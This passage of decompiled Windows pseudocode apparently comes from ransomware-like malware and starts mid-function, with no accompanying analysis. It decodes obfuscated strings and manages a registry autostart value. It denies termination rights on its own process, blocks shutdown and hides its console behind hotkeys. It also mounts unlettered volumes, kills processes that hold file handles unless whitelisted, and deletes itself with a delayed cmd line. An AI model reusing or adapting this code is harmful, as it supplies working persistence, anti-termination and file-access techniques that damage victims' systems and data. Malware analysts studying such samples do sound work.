  int v16; // [esp+667h] [ebp-2Dh]
  char v17; // [esp+66Bh] [ebp-29h]
  wchar_t v18[6]; // [esp+66Ch] [ebp-28h] BYREF
  WCHAR ValueName[12]; // [esp+678h] [ebp-1Ch] BYREF
  HKEY phkResult; // [esp+690h] [ebp-4h] BYREF

  strcpy(SubKey, "\"qmdvucpg~oKAPMQMDV~uKLFMUQ~aWPPGLVtGPQKML~pWL");
  Type = 1;
  for ( i = 0; i < 0x2D; ++i )
    SubKey[i + 1] ^= SubKey[0];
  SubKey[46] = 0;
  v3 = 0;
  if ( RegCreateKeyExA(HKEY_CURRENT_USER, &SubKey[1], 0, 0, 0, 0x2001Fu, 0, &phkResult, &dwDisposition) )
    return v3;
  wcscpy(ValueName, L"XO1XADpO01");
  if ( !this )
  {
    GetModuleFileNameW(0, Filename, 0x104u);
    cbData = 260;
    wcscpy(v18, L"\"%S\"");
    v6 = wsprintfW(String2, v18, Filename);
    if ( RegQueryValueExW(phkResult, ValueName, 0, &Type, (LPBYTE)Data, &cbData)
      || (v7 = lstrcmpW(Data, String2), v3 = v7 == 0, v7) )
    {
      v3 = RegSetValueExW(phkResult, ValueName, 0, 1u, (const BYTE *)String2, 2 * v6) == 0;
    }
    RegCloseKey(phkResult);
    return v3;
  }
  RegDeleteValueW(phkResult, ValueName);
  v4 = 0;
  *(_OWORD *)v15 = xmmword_419040;
  v16 = 286065480;
  v17 = 0;
  do
    v15[++v4] ^= v15[0];
  while ( v4 < 0x13 );
  v17 = 0;
  sub_4100C0(&v15[1]);
  RegCloseKey(phkResult);
  return 1;
}
// 419040: using guessed type __int128 xmmword_419040;
// 40F570: using guessed type WCHAR Data[260];

//----- (0040F750) --------------------------------------------------------
BOOL sub_40F750()
{
  WCHAR v1[520]; // [esp+Ch] [ebp-6C0h] BYREF
  WCHAR Filename[260]; // [esp+41Ch] [ebp-2B0h] BYREF
  SHELLEXECUTEINFOW pExecInfo; // [esp+624h] [ebp-A8h] BYREF
  int v4[23]; // [esp+660h] [ebp-6Ch] BYREF
  int v5[4]; // [esp+6BCh] [ebp-10h] BYREF

  GetModuleFileNameW(0, Filename, 0x104u);
  wcscpy((wchar_t *)v4, L" /C ping 1.1.1.1 -n 20 > Nul & Del /f /q \"%s\"");
  wsprintfW(v1, (LPCWSTR)v4, Filename);
  v5[0] = 7143523;
  pExecInfo.lpFile = (LPCWSTR)v5;
  v5[1] = 3014756;
  pExecInfo.lpParameters = v1;
  v5[2] = 7864421;
  v5[3] = 101;
  pExecInfo.cbSize = 60;
  pExecInfo.fMask = 1024;
  pExecInfo.hwnd = 0;
  pExecInfo.lpVerb = 0;
  memset(&pExecInfo.lpDirectory, 0, 12);
  return ShellExecuteExW(&pExecInfo);
}

//----- (0040F8C0) --------------------------------------------------------
int sub_40F8C0()
{
  unsigned int v0; // eax
  HMODULE ModuleHandleA; // eax
  FARPROC ProcAddress; // eax
  CHAR ProcName[16]; // [esp+6h] [ebp-1Eh] BYREF
  _WORD v5[7]; // [esp+16h] [ebp-Eh] BYREF

  v0 = 0;
  *(_DWORD *)&v5[5] = 0;
  *(_OWORD *)ProcName = xmmword_418FA0;
  do
    ProcName[++v0] ^= ProcName[0];
  while ( v0 < 0xE );
  strcpy((char *)v5, "|kernel32");
  ProcName[15] = 0;
  ModuleHandleA = GetModuleHandleA((LPCSTR)v5 + 1);
  ProcAddress = GetProcAddress(ModuleHandleA, &ProcName[1]);
  if ( ProcAddress )
    ((void (__stdcall *)(int, _WORD *))ProcAddress)(-1, &v5[5]);
  return *(_DWORD *)&v5[5];
}
// 418FA0: using guessed type __int128 xmmword_418FA0;

//----- (0040F970) --------------------------------------------------------
void __noreturn start()
{
  const WCHAR *CommandLineW; // eax
  void (__stdcall *v1)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD); // edi
  SC_HANDLE v2; // esi
  unsigned int v3; // ecx
  DWORD CurrentProcessId; // eax
  HANDLE v5; // ebx
  DWORD LengthSid; // eax
  size_t v7; // esi
  struct _ACL *v8; // eax
  struct _ACL *v9; // edi
  DWORD v10; // esi
  SC_HANDLE v11; // esi
  unsigned int v12; // ecx
  DWORD TickCount; // edi
  DWORD v14; // eax
  DWORD v15; // kr00_4
  unsigned int v16; // edi
  unsigned int v17; // esi
  unsigned int v18; // ecx
  HWND ConsoleWindow; // eax
  HWND v20; // eax
  unsigned int v21; // ecx
  int i; // esi
  DWORD FileAttributesW; // eax
  PSID pSid; // [esp+Ch] [ebp-2E4h] BYREF
  int pNumArgs; // [esp+10h] [ebp-2E0h] BYREF
  unsigned int v26; // [esp+14h] [ebp-2DCh] BYREF
  LPVOID pAce; // [esp+18h] [ebp-2D8h] BYREF
  struct _SID_IDENTIFIER_AUTHORITY pIdentifierAuthority; // [esp+1Ch] [ebp-2D4h] BYREF
  unsigned __int8 OldValue; // [esp+27h] [ebp-2C9h] BYREF
  PACL ppDacl; // [esp+28h] [ebp-2C8h] BYREF
  DWORD v31; // [esp+2Ch] [ebp-2C4h] BYREF
  CHAR v32[16]; // [esp+33h] [ebp-2BDh] BYREF
  char v33; // [esp+43h] [ebp-2ADh]
  int pAclInformation[3]; // [esp+44h] [ebp-2ACh] BYREF
  CHAR v35[16]; // [esp+51h] [ebp-29Fh] BYREF
  char v36[21]; // [esp+61h] [ebp-28Fh] BYREF
  _OWORD v37[2]; // [esp+76h] [ebp-27Ah] BYREF
  __int16 v38; // [esp+96h] [ebp-25Ah]
  DWORD ThreadId; // [esp+98h] [ebp-258h] BYREF
  CHAR v40[16]; // [esp+9Dh] [ebp-253h] BYREF
  __int128 v41; // [esp+ADh] [ebp-243h]
  __int128 v42; // [esp+BDh] [ebp-233h]
  __int128 v43; // [esp+CDh] [ebp-223h]
  char v44[531]; // [esp+DDh] [ebp-213h] BYREF

  pNumArgs = 0;
  CommandLineW = GetCommandLineW();
  pSid = CommandLineToArgvW(CommandLineW, &pNumArgs);
  if ( pNumArgs >= 2 )
  {
    if ( !sub_412730() )
      ExitProcess(0xFFFFFFFF);
    for ( i = 1; i < pNumArgs; ++i )
    {
      FileAttributesW = GetFileAttributesW(*((LPCWSTR *)pSid + i));
      if ( FileAttributesW != -1 )
      {
        if ( (FileAttributesW & 0x10) != 0 )
        {
          sub_4092E0(*((__int16 **)pSid + i));
        }
        else
        {
          if ( (FileAttributesW & 1) != 0 )
            SetFileAttributesW(*((LPCWSTR *)pSid + i), 0x80u);
          sub_412A40(*((LPCWSTR *)pSid + i));
        }
      }
    }
    do
      Sleep(0xAu);
    while ( dword_41D330 );
    ExitProcess(0);
  }
  InitializeCriticalSection(&stru_41B938);
  v1 = (void (__stdcall *)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD))CreateThread;
  CreateThread(0, 0, sub_40FEF0, 0, 0, &ThreadId);
  v2 = OpenSCManagerA(0, 0, 0xF003Fu);
  if ( v2 || GetLastError() != 5 )
  {
    CloseServiceHandle(v2);
  }
  else
  {
    GetModuleFileNameW(0, (LPWSTR)&v44[3], 0x104u);
    v26 = 0;
    sub_40A2F0(&v26);
    if ( v26 == 1 )
    {
      sub_413F30();
      sub_413B70(&v44[3]);
      ExitProcess(0);
    }
    v3 = 0;
    *(_OWORD *)v35 = xmmword_4197F0;
    strcpy(v36, "!vhui!mhlhude!shfiur");
    do
      v35[++v3] ^= v35[0];
    while ( v3 < 0x23 );
    v36[20] = 0;
    sub_4100C0(&v35[1]);
  }
  if ( sub_40A4D0() )
    ExitProcess(0xFFFFFFFF);
  sub_40F570(0);
  sub_40F4C0();
  ppDacl = 0;
  pSid = 0;
  *(_DWORD *)pIdentifierAuthority.Value = 0;
  *(_WORD *)&pIdentifierAuthority.Value[4] = 256;
  CurrentProcessId = GetCurrentProcessId();
  v5 = OpenProcess(0x60000u, 0, CurrentProcessId);
  if ( v5 )
  {
    if ( !GetSecurityInfo(v5, SE_KERNEL_OBJECT, 4u, 0, 0, &ppDacl, 0, 0)
      && AllocateAndInitializeSid(&pIdentifierAuthority, 1u, 0, 0, 0, 0, 0, 0, 0, 0, &pSid) )
    {
      GetAclInformation(ppDacl, pAclInformation, 0xCu, AclSizeInformation);
      LengthSid = GetLengthSid(pSid);
      v7 = pAclInformation[1] + 16 + 2 * LengthSid;
      v8 = (struct _ACL *)malloc(v7);
      v9 = v8;
      if ( v8 )
      {
        if ( InitializeAcl(v8, v7, 4u) && AddAccessDeniedAce(v9, 4u, 1u, pSid) )
        {
          v10 = 0;
          if ( pAclInformation[0] )
          {
            while ( 1 )
            {
              pAce = 0;
              if ( !GetAce(ppDacl, v10, &pAce) || !AddAce(v9, 4u, 0xFFFFFFFF, pAce, *((unsigned __int16 *)pAce + 1)) )
                break;
              if ( ++v10 >= pAclInformation[0] )
                goto LABEL_22;
            }
          }
          else
          {
LABEL_22:
            SetSecurityInfo(v5, SE_KERNEL_OBJECT, 4u, 0, 0, v9, 0);
          }
        }
        free(v9);
      }
      v1 = (void (__stdcall *)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD))CreateThread;
    }
    CloseHandle(v5);
  }
  if ( pSid )
    FreeSid(pSid);
  SetErrorMode(7u);
  v11 = OpenSCManagerA(0, 0, 0xF003Fu);
  if ( v11 || GetLastError() != 5 )
  {
    CloseServiceHandle(v11);
    v11 = (SC_HANDLE)1;
  }
  v1(0, 0, sub_410510, 0, 0, &v31);
  if ( v11 )
    v1(0, 0, sub_40A8B0, 0, 0, &v31);
  if ( !sub_412730() )
  {
    v12 = 0;
    v37[0] = xmmword_419010;
    v38 = 28;
    v37[1] = xmmword_419140;
    do
      *((_BYTE *)v37 + ++v12) ^= LOBYTE(v37[0]);
    while ( v12 < 0x20 );
    HIBYTE(v38) = 0;
    sub_4100C0((LPCSTR)v37 + 1);
    ExitProcess(0xFFFFFFFF);
  }
  RtlAdjustPrivilege(9u, 1u, 0, &OldValue);
  v1(0, 0, (LPTHREAD_START_ROUTINE)sub_4088C0, 0, 0, &v31);
  TickCount = GetTickCount();
  sub_408EE0();
  v14 = GetTickCount();
  v33 = 0;
  v15 = v14 - TickCount;
  *(_OWORD *)v32 = xmmword_419120;
  v16 = (v14 - TickCount) / 0x5265C00;
  v17 = v15 % 0x5265C00 % 0x36EE80;
  v26 = v17 / 0xEA60;
  v18 = 0;
  pAce = (LPVOID)(v17 % 0xEA60 / 0x3E8);
  do
    v32[++v18] ^= v32[0];
  while ( v18 < 0xF );
  v33 = 0;
  sub_4100C0(&v32[1]);
  sub_409A20();
  sub_40F570((void *)1);
  ConsoleWindow = GetConsoleWindow();
  if ( IsWindowVisible(ConsoleWindow) )
  {
    v20 = GetConsoleWindow();
    FlashWindow(v20, 0);
    v21 = 0;
    *(_OWORD *)v40 = xmmword_4194C0;
    strcpy(v44, "ER");
    v41 = xmmword_419610;
    v42 = xmmword_419510;
    v43 = xmmword_419590;
    do
      v40[++v21] ^= v40[0];
    while ( v21 < 0x41 );
    v44[2] = 0;
    sub_4100C0(&v40[1], v16, v15 % 0x5265C00 / 0x36EE80, v26, pAce);
    Sleep(0xEA60u);
  }
  sub_40F750();
  ExitProcess(0x309u);
}
// 419010: using guessed type __int128 xmmword_419010;
// 419120: using guessed type __int128 xmmword_419120;
// 419140: using guessed type __int128 xmmword_419140;
// 4194C0: using guessed type __int128 xmmword_4194C0;
// 419510: using guessed type __int128 xmmword_419510;
// 419590: using guessed type __int128 xmmword_419590;
// 419610: using guessed type __int128 xmmword_419610;
// 4197F0: using guessed type __int128 xmmword_4197F0;
// 41D330: using guessed type int dword_41D330;

//----- (0040FEF0) --------------------------------------------------------
ULONG __stdcall sub_40FEF0(PVOID Parameter)
{
  HWND ConsoleWindow; // edi
  unsigned int v2; // ecx
  LONG WindowLongA; // eax
  HMENU SystemMenu; // eax
  HMENU v5; // esi
  HANDLE StdHandle; // esi
  DWORD Mode; // [esp+10h] [ebp-30h] BYREF
  CHAR ConsoleTitle[16]; // [esp+14h] [ebp-2Ch] BYREF
  struct tagMSG Msg; // [esp+24h] [ebp-1Ch] BYREF

  AllocConsole();
  ConsoleWindow = GetConsoleWindow();
  ShowWindow(ConsoleWindow, 0);
  v2 = 0;
  strcpy(ConsoleTitle, "\rAbnfOdy-_lc~b`");
  do
    ConsoleTitle[++v2] ^= ConsoleTitle[0];
  while ( v2 < 0xE );
  ConsoleTitle[15] = 0;
  SetConsoleTitleA(&ConsoleTitle[1]);
  SetConsoleCtrlHandler(HandlerRoutine, 1);
  SetProcessShutdownParameters(0, 0);
  WindowLongA = GetWindowLongA(ConsoleWindow, -20);
  SetWindowLongA(ConsoleWindow, -20, WindowLongA | 0x80000);
  SetLayeredWindowAttributes(ConsoleWindow, 0, 0xD8u, 2u);
  SystemMenu = GetSystemMenu(ConsoleWindow, 0);
  v5 = SystemMenu;
  if ( SystemMenu )
  {
    EnableMenuItem(SystemMenu, 0xF060u, 3u);
    DeleteMenu(v5, 0xF060u, 0);
  }
  StdHandle = GetStdHandle(0xFFFFFFF6);
  if ( StdHandle != (HANDLE)-1 )
  {
    GetConsoleMode(StdHandle, &Mode);
    SetConsoleMode(StdHandle, Mode & 0xFFFFFF3F | 0x80);
  }
  RegisterHotKey(0, 1, 4u, 0x70u);
  RegisterHotKey(0, 2, 0, 0x70u);
  while ( GetMessageW(&Msg, 0, 0, 0) )
  {
    PeekMessageW(&Msg, 0, 0, 0, 0);
    if ( Msg.message == 786 )
    {
      if ( Msg.wParam == 1 )
      {
        ShowWindow(ConsoleWindow, 5);
      }
      else if ( Msg.wParam == 2 )
      {
        ShowWindow(ConsoleWindow, 0);
      }
    }
  }
  return 0;
}

//----- (00410060) --------------------------------------------------------
BOOL __stdcall HandlerRoutine(DWORD CtrlType)
{
  BOOL result; // eax
  HWND ConsoleWindow; // eax

  switch ( CtrlType )
  {
    case 0u:
      result = 1;
      break;
    case 1u:
    case 2u:
    case 5u:
    case 6u:
      ConsoleWindow = GetConsoleWindow();
      ShutdownBlockReasonCreate(ConsoleWindow, 0);
      Sleep(0xFFFFFFFF);
      result = 1;
      break;
    default:
      result = 0;
      break;
  }
  return result;
}

//----- (004100C0) --------------------------------------------------------
DWORD sub_4100C0(LPCSTR a1, ...)
{
  DWORD v1; // eax
  int v2; // edi
  unsigned int v3; // ecx
  HANDLE StdHandle; // esi
  DWORD i; // eax
  DWORD j; // eax
  CHAR v8[1024]; // [esp+10h] [ebp-534h] BYREF
  CHAR Buffer[256]; // [esp+410h] [ebp-134h] BYREF
  struct _SYSTEMTIME SystemTime; // [esp+510h] [ebp-34h] BYREF
  char v11[20]; // [esp+523h] [ebp-21h] BYREF
  char v12[5]; // [esp+537h] [ebp-Dh] BYREF
  DWORD v13[2]; // [esp+53Ch] [ebp-8h] BYREF
  va_list va; // [esp+550h] [ebp+Ch] BYREF

  va_start(va, a1);
  v13[0] = 0;
  memset(v8, 0, sizeof(v8));
  v1 = 0;
  if ( a1 && *a1 )
  {
    do
      ++v1;
    while ( a1[v1] );
  }
  v13[0] = v1;
  v2 = wvsprintfA(v8, a1, va);
  v11[19] = 2;
  strcpy(v12, "%s\r\n");
  wsprintfA(v8, v12, v8);
  GetLocalTime(&SystemTime);
  v3 = 0;
  strcpy(v11, "|'YRN\tFYRN\tFYRN\t!\\");
  do
    v11[++v3] ^= v11[0];
  while ( v3 < 0x11 );
  v11[18] = 0;
  wsprintfA(Buffer, &v11[1], SystemTime.wHour, SystemTime.wMinute, SystemTime.wSecond);
  if ( v2 >= (int)v13[0] || !GetLastError() )
  {
    StdHandle = GetStdHandle(0xFFFFFFF5);
    if ( StdHandle != (HANDLE)-1 )
    {
      EnterCriticalSection(&stru_41B938);
      SetConsoleTextAttribute(StdHandle, 0xAu);
      for ( i = 0; Buffer[i]; ++i )
        ;
      WriteConsoleA(StdHandle, Buffer, i, v13, 0);
      SetConsoleTextAttribute(StdHandle, 0xFu);
      for ( j = 0; v8[j]; ++j )
        ;
      WriteConsoleA(StdHandle, v8, j, v13, 0);
      LeaveCriticalSection(&stru_41B938);
    }
  }
  return v13[0];
}
// 4100C0: using guessed type CHAR var_534[1024];
// 4100C0: using guessed type CHAR Buffer[256];

//----- (00410260) --------------------------------------------------------
void __fastcall sub_410260(const WCHAR *arglist)
{
  void *v2; // esi
  UINT DriveTypeW; // eax
  HANDLE FileW; // eax
  int v5; // edi
  unsigned int v6; // ecx
  WCHAR FileName[260]; // [esp+Ch] [ebp-26Ch] BYREF
  WCHAR szVolumeMountPoint[16]; // [esp+214h] [ebp-64h] BYREF
  int v9[6]; // [esp+234h] [ebp-44h] BYREF
  CHAR v10[16]; // [esp+24Fh] [ebp-29h] BYREF
  int v11; // [esp+25Fh] [ebp-19h]
  int v12; // [esp+263h] [ebp-15h]
  char v13; // [esp+267h] [ebp-11h]
  _DWORD v14[3]; // [esp+268h] [ebp-10h] BYREF
  DWORD cchBufferLength; // [esp+274h] [ebp-4h] BYREF

  cchBufferLength = 521;
  v2 = malloc(0x412u);
  if ( v2 )
  {
    while ( !GetVolumePathNamesForVolumeNameW(arglist, (LPWCH)v2, cchBufferLength, &cchBufferLength)
         && GetLastError() == 234 )
    {
      free(v2);
      v2 = malloc(2 * cchBufferLength);
      if ( !v2 )
        return;
    }
    DriveTypeW = GetDriveTypeW(arglist);
    if ( (DriveTypeW == 2 || DriveTypeW == 3) && cchBufferLength < 3 )
    {
      wcscpy((wchar_t *)v9, L"%s\\bootmgr");
      wsprintfW(FileName, (LPCWSTR)v9, arglist);
      FileW = CreateFileW(FileName, 0x80000000, 3u, 0, 3u, 0x80u, 0);
      if ( FileW == (HANDLE)-1 )
      {
        wcscpy((wchar_t *)v14, L"%C:\\");
        v5 = 25;
        wsprintfW(szVolumeMountPoint, (LPCWSTR)v14, 90);
        if ( SetVolumeMountPointW(szVolumeMountPoint, arglist) )
        {
LABEL_13:
          v6 = 0;
          *(_OWORD *)v10 = xmmword_4194A0;
          v11 = 1125602130;
          v12 = 1678907224;
          v13 = 0;
          do
            v10[++v6] ^= v10[0];
          while ( v6 < 0x17 );
          v13 = 0;
          sub_4100C0(&v10[1], arglist, szVolumeMountPoint);
        }
        else
        {
          while ( --v5 != -1 )
          {
            v14[0] = 4390949;
            LOWORD(v14[2]) = 0;
            v14[1] = 6029370;
            wsprintfW(szVolumeMountPoint, (LPCWSTR)v14, v5 + 65);
            if ( SetVolumeMountPointW(szVolumeMountPoint, arglist) )
              goto LABEL_13;
          }
        }
      }
      else
      {
        CloseHandle(FileW);
      }
    }
    free(v2);
  }
}
// 41041E: conditional instruction was optimized away because esi.4!=0
// 4194A0: using guessed type __int128 xmmword_4194A0;

//----- (00410510) --------------------------------------------------------
ULONG __stdcall sub_410510(PVOID Parameter)
{
  HANDLE FirstVolumeW; // edi
  WCHAR *v3; // eax
  int i; // ecx
  int v5; // esi
  DWORD DosDeviceW; // eax
  WCHAR TargetPath[260]; // [esp+Ch] [ebp-410h] BYREF
  WCHAR szVolumeName[4]; // [esp+214h] [ebp-208h] BYREF
  WCHAR DeviceName[256]; // [esp+21Ch] [ebp-200h] BYREF

  FirstVolumeW = FindFirstVolumeW(szVolumeName, 0x104u);
  if ( FirstVolumeW != (HANDLE)-1 )
  {
    while ( 1 )
    {
      v3 = szVolumeName;
      for ( i = 0; *v3; ++i )
        ++v3;
      v5 = i - 1;
      if ( szVolumeName[0] == 92
        && szVolumeName[1] == 92
        && szVolumeName[2] == 63
        && szVolumeName[3] == szVolumeName[0]
        && szVolumeName[v5] == szVolumeName[0] )
      {
        szVolumeName[v5] = 0;
        DosDeviceW = QueryDosDeviceW(DeviceName, TargetPath, 0x104u);
        szVolumeName[v5] = 92;
        if ( DosDeviceW )
        {
          sub_410260(szVolumeName);
          if ( FindNextVolumeW(FirstVolumeW, szVolumeName, 0x104u) )
            continue;
        }
      }
      FindVolumeClose(FirstVolumeW);
      ExitThread(0);
    }
  }
  return 0;
}
// 410510: using guessed type WCHAR TargetPath[260];
// 410510: using guessed type WCHAR DeviceName[256];

//----- (00410610) --------------------------------------------------------
int __thiscall sub_410610(void *this)
{
  HMODULE ModuleHandleA; // edx
  unsigned int v3; // ecx
  FARPROC ProcAddress; // ebx
  unsigned int v5; // ecx
  FARPROC v6; // eax
  int v7; // ebx
  FARPROC v8; // esi
  FARPROC v9; // eax
  unsigned int v10; // ecx
  unsigned int v12; // ebx
  unsigned int v13; // esi
  char *v14; // edi
  int v15; // ebx
  unsigned int v16; // ecx
  FARPROC v17; // esi
  size_t v18; // ecx
  char *v19; // ebx
  int v20; // esi
  char *v21; // esi
  char *v22; // eax
  int v23; // ecx
  int v24; // edx
  char *v25; // ecx
  int v26; // eax
  DWORD v27; // ecx
  _WORD *v28; // eax
  unsigned int i; // ebx
  __int16 v30; // ax
  _WORD *v31; // edi
  char v32; // dl
  int v33; // eax
  unsigned int v34; // ecx
  int v35; // ecx
  char v36[16]; // [esp+0h] [ebp-1A8h] BYREF
  char v37[8]; // [esp+10h] [ebp-198h] BYREF
  int v38[3]; // [esp+18h] [ebp-190h] BYREF
  __int64 v39; // [esp+24h] [ebp-184h]
  int v40; // [esp+2Ch] [ebp-17Ch]
  char v41[4]; // [esp+30h] [ebp-178h] BYREF
  unsigned int v42; // [esp+34h] [ebp-174h]
  int v43[29]; // [esp+38h] [ebp-170h]
  char v44[11]; // [esp+ACh] [ebp-FCh] BYREF
  CHAR v45[16]; // [esp+B7h] [ebp-F1h] BYREF
  __int128 v46; // [esp+C7h] [ebp-E1h]
  int v47; // [esp+D7h] [ebp-D1h]
  int v48; // [esp+DBh] [ebp-CDh]
  char v49; // [esp+DFh] [ebp-C9h]
  void (__stdcall *v50)(char *); // [esp+E0h] [ebp-C8h]
  void (__stdcall *v51)(int); // [esp+E4h] [ebp-C4h]
  int v52; // [esp+E8h] [ebp-C0h]
  char *v53; // [esp+ECh] [ebp-BCh]
  char *v54; // [esp+F0h] [ebp-B8h]
  FARPROC v55; // [esp+F4h] [ebp-B4h]
  int v56; // [esp+F8h] [ebp-B0h]
  char *v57; // [esp+FCh] [ebp-ACh]
  CHAR ProcName[16]; // [esp+102h] [ebp-A6h] BYREF
  int v59; // [esp+112h] [ebp-96h]
  __int16 v60; // [esp+116h] [ebp-92h]
  char v61[24]; // [esp+118h] [ebp-90h] BYREF
  char v62[26]; // [esp+130h] [ebp-78h] BYREF
  __int128 v63; // [esp+14Ah] [ebp-5Eh] BYREF
  int v64; // [esp+15Ah] [ebp-4Eh]
  int v65; // [esp+15Eh] [ebp-4Ah]
  int v66; // [esp+162h] [ebp-46h]
  __int16 v67; // [esp+166h] [ebp-42h]
  int v68; // [esp+168h] [ebp-40h] BYREF
  int v69; // [esp+16Ch] [ebp-3Ch]
  char *v70; // [esp+170h] [ebp-38h]
  unsigned int v71; // [esp+174h] [ebp-34h]
  int v72; // [esp+178h] [ebp-30h]
  size_t v73; // [esp+17Ch] [ebp-2Ch] BYREF
  char v74[21]; // [esp+183h] [ebp-25h] BYREF
  CHAR ModuleName[8]; // [esp+198h] [ebp-10h] BYREF
  int v76; // [esp+1A0h] [ebp-8h]
  char v77; // [esp+1A6h] [ebp-2h]
  char v78; // [esp+1A7h] [ebp-1h]

  ModuleHandleA = hModule;
  if ( !hModule )
  {
    strcpy(ModuleName, "Nntdll");
    ModuleHandleA = GetModuleHandleA(&ModuleName[1]);
    hModule = ModuleHandleA;
  }
  v3 = 0;
  *(_OWORD *)ProcName = xmmword_4196C0;
  v59 = 1700952447;
  v60 = 108;
  do
    ProcName[++v3] ^= ProcName[0];
  while ( v3 < 0x14 );
  HIBYTE(v60) = 0;
  ProcAddress = GetProcAddress(ModuleHandleA, &ProcName[1]);
  *(_OWORD *)v45 = xmmword_419390;
  v5 = 0;
  v50 = (void (__stdcall *)(char *))ProcAddress;
  v46 = xmmword_419230;
  v47 = 170726922;
  v48 = 218827295;
  v49 = 0;
  do
    v45[++v5] ^= v45[0];
  while ( v5 < 0x27 );
  v49 = 0;
  v6 = GetProcAddress(hModule, &v45[1]);
  if ( !ProcAddress || !v6 )
    return 1626;
  v7 = ((int (__stdcall *)(void *, char *, _DWORD, _DWORD))v6)(this, v44, 0, 0);
  if ( v7 < 0 )
    return v7;
  strcpy(&v74[9], "\nNtOpenFile");
  v38[2] = (int)v44;
  v78 = 102;
  v77 = 111;
  v38[0] = 24;
  v38[1] = 0;
  v39 = 0i64;
  v40 = 0;
  v8 = GetProcAddress(hModule, &v74[10]);
  strcpy(v74, "nNtClose");
  v9 = GetProcAddress(hModule, &v74[1]);
  v51 = (void (__stdcall *)(int))v9;
  if ( !v8 || !v9 )
  {
    v7 = 1626;
    goto LABEL_62;
  }
  v7 = ((int (__stdcall *)(int *, int, int *, char *, int, _DWORD))v8)(&v68, 128, v38, v37, 7, 0);
  if ( v7 < 0 )
  {
LABEL_62:
    v50(v44);
    return v7;
  }
  v10 = 0;
  v56 = v68;
  strcpy(v61, "5{Ad@PGL|[SZGXTA\\Z[s\\YP");
  do
    v61[++v10] ^= v61[0];
  while ( v10 < 0x16 );
  v61[23] = 0;
  v55 = GetProcAddress(hModule, &v61[1]);
  if ( v55 )
  {
    v12 = 0;
    v71 = 0;
    v13 = 260;
    sub_4010AD((unsigned __int8)byte_41D318, v36[0]);
    v14 = v70;
    v57 = v36;
    v76 = 0;
    while ( 1 )
    {
      if ( v12 < v13 )
      {
        sub_4010AD(v13 - v12, v36[0]);
        v14 = v36;
        v12 = v57 - v36;
        v70 = v36;
        v71 = v57 - v36;
      }
      v15 = ((int (__stdcall *)(int, char *, char *, unsigned int, int))v55)(v56, v41, v14, v12, 47);
      v72 = v15;
      if ( v15 >= 0 )
      {
        if ( *(_DWORD *)v14 )
        {
          v16 = 0;
          strcpy(v62, "\x1BUoJn~ibHbho~vRu}tivzortu");
          do
            v62[++v16] ^= v62[0];
          while ( v16 < 0x18 );
          v62[25] = 0;
          v17 = GetProcAddress(hModule, &v62[1]);
          v18 = 0x8000;
          *(_DWORD *)ModuleName = v17;
          v73 = 0x8000;
          if ( v17 )
          {
            v43[0] = 748272542;
            v43[1] = 671253484;
            v43[2] = -1310727586;
            v43[3] = -258659521;
            v43[4] = -486274365;
            v43[5] = -537310194;
            v43[6] = 588073999;
            v43[7] = -302013729;
            v43[8] = 1987697369;
            v43[9] = -539696720;
            v43[10] = 738441920;
            v43[11] = -1293483494;
            v43[12] = -1562676551;
            v43[13] = 734612495;
            v43[14] = 1821469599;
            v43[15] = 1606975915;
            v43[16] = 1662534526;
            v43[17] = 855327518;
            v43[18] = -285738077;
            v43[19] = 1021347892;
            v43[20] = 1241572365;
            v43[21] = -2046453643;
            v43[22] = 1921823265;
            v43[23] = 1580009376;
            v43[24] = 688124591;
            v43[25] = 872092269;
            v43[26] = 1754654948;
            while ( 1 )
            {
              v19 = (char *)malloc(v18);
              v53 = v19;
              if ( !v19 )
                break;
              v20 = ((int (__stdcall *)(int, char *, size_t, size_t *))v17)(5, v19, v73, &v73);
              v52 = v20;
              if ( v20 >= 0 )
              {
                v21 = v19;
                v22 = v14 + 4;
                v23 = 0;
                while ( 2 )
                {
                  v24 = *(_DWORD *)v14;
                  v21 += v23;
                  v69 = *(_DWORD *)v14;
                  v25 = v22;
                  do
                  {
                    v26 = *(_DWORD *)v25;
                    v25 += 4;
                    v54 = v25;
                    if ( v26 == *((_DWORD *)v21 + 17) )
                    {
                      v27 = 0;
                      v28 = (_WORD *)*((_DWORD *)v21 + 15);
                      if ( v28 && *v28 )
                      {
                        do
                        {
                          ++v28;
                          ++v27;
                        }
                        while ( *v28 );
                      }
                      CharLowerBuffW(*((LPWSTR *)v21 + 15), v27);
                      for ( i = 0; i < 0x1B; ++i )
                      {
                        v30 = **((_WORD **)v21 + 15);
                        if ( v30 )
                        {
                          v31 = (_WORD *)*((_DWORD *)v21 + 15);
                          v32 = v30 - 32;
                          if ( *v31 < 0x61u )
                            v32 = **((_WORD **)v21 + 15);
                          v33 = sub_401030(v31 + 1, v32);
                          v14 = v70;
                        }
                        else
                        {
                          v33 = 0;
                        }
                        if ( v33 == v43[i] )
                        {
                          v25 = v54;
                          v24 = v69;
                          goto LABEL_45;
                        }
                      }
                      v34 = 0;
                      v63 = xmmword_4192E0;
                      v64 = 1713204760;
                      v65 = 123294797;
                      v66 = 1498486813;
                      v67 = 96;
                      do
                        *((_BYTE *)&v63 + ++v34) ^= v63;
                      while ( v34 < 0x1C );
                      HIBYTE(v67) = 0;
                      sub_4100C0((LPCSTR)&v63 + 1, *((_DWORD *)v21 + 15), *((_DWORD *)v21 + 17));
                      sub_40F270(*((void **)v21 + 17));
                      v15 = v72;
                      v35 = ++v76;
                      goto LABEL_57;
                    }
LABEL_45:
                    v69 = --v24;
                  }
                  while ( v24 );
                  v23 = *(_DWORD *)v21;
                  v22 = v14 + 4;
                  if ( *(_DWORD *)v21 )
                    continue;
                  break;
                }
                v19 = v53;
                v20 = v52;
              }
              free(v19);
              if ( v20 != -1073741820 )
              {
                if ( v20 == 1 )
                {
                  v15 = v72;
                  v35 = ++v76;
                  goto LABEL_57;
                }
                break;
              }
              v18 = v73;
              v17 = *(FARPROC *)ModuleName;
            }
            v15 = v72;
          }
        }
      }
      v35 = v76;
LABEL_57:
      v13 = v42;
      if ( v15 != -1073741820 )
        break;
      v12 = v71;
    }
    if ( v35 > 0 )
      v15 = 1;
    v51(v68);
    v50(v44);
    return v15;
  }
  else
  {
    v51(v68);
    v50(v44);
    return 1626;
  }
}
// 419230: using guessed type __int128 xmmword_419230;
// 4192E0: using guessed type __int128 xmmword_4192E0;
// 419390: using guessed type __int128 xmmword_419390;
